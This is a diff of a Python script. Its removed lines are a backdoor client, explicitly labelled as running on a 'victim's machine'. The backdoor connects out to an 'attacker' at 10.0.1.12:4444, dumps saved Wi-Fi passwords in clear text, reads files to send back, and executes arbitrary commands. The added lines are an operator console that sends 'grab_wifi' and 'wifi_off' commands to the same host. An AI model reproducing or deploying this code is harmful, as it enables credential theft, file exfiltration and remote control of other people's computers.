@@ -1,72 +1,40 @@
 import socket
-import os
+import subprocess
 
-# Function to grab Wi-Fi password for a given network name
-def grab_wifi(network_name):
-    command = f'netsh wlan show profile "{network_name}" key=clear'
-    result = os.popen(command).read()
-    return result
-
-# Function to upload a file from the victim to the attacker
-def upload(file_path):
+def send_command(command):
     try:
-        with open(file_path, 'rb') as f:
-            data = f.read()
-            return data
+        # Connect to the Netcat server (localhost, port 12345)
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
+            client_socket.connect(('10.0.1.12', 4444))
+            client_socket.send(command.encode())
+            response = client_socket.recv(4096).decode()
+            return response
     except Exception as e:
-        return f"Error reading file: {e}"
+        return f"Error connecting to server: {e}"
 
-# Function to execute a command or file on the victim's machine
-def run(file_path):
-    try:
-        result = os.popen(file_path).read()
-        return result
-    except Exception as e:
-        return f"Error executing file: {e}"
+def grab_wifi():
+    return send_command('grab_wifi')
 
-# Function to handle the connection with the attacker and receive commands
-def handle_commands(client_socket):
+def wifi_off(interface_name):
+    return send_command(f'wifi_off {interface_name}')
+
+if __name__ == '__main__':
     while True:
-        try:
-            command = client_socket.recv(1024).decode('utf-8')
-            
-            if command.lower() == "exit":
-                print("[*] Closing connection.")
-                client_socket.close()
-                break
+        print("\nAvailable commands:")
+        print("1. grab_wifi - Get all saved WiFi passwords")
+        print("2. wifi_off <interface_name> - Disconnect from WiFi")
+        print("3. quit - Exit the program")
+        command = input("\nEnter command: ")
 
-            elif command.startswith("grab_wifi"):
-                network_name = command.split(" ")[1]
-                result = grab_wifi(network_name)
-                client_socket.send(result.encode('utf-8'))
-
-            elif command.startswith("upload"):
-                file_path = command.split(" ")[1]
-                result = upload(file_path)
-                client_socket.send(result)  # Send file content back
-
-            elif command.startswith("run"):
-                file_path = command.split(" ")[1]
-                result = run(file_path)
-                client_socket.send(result.encode('utf-8'))
-
-            else:
-                client_socket.send("Unknown command".encode('utf-8'))
-
-        except Exception as e:
-            print(f"Error: {e}")
+        if command.lower() == 'quit':
             break
-
-# Main function to connect to the attacker's server
-def connect_to_server():
-    server_ip = "10.0.1.12"  # Replace with the attacker's IP address
-    server_port = 4444  # The port the listener is listening on
-
-    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    client_socket.connect((server_ip, server_port))
-    print("[*] Connected to the server")
-
-    handle_commands(client_socket)
-
-if __name__ == "__main__":
-    connect_to_server()
+        elif command.startswith('wifi_off'):
+            interface_name = command.split(' ')[1] if len(command.split(' ')) > 1 else ''
+            if interface_name:
+                print(wifi_off(interface_name))
+            else:
+                print("Please specify an interface name after wifi_off")
+        elif command == 'grab_wifi':
+            print(grab_wifi())
+        else:
+            print("Invalid command.")
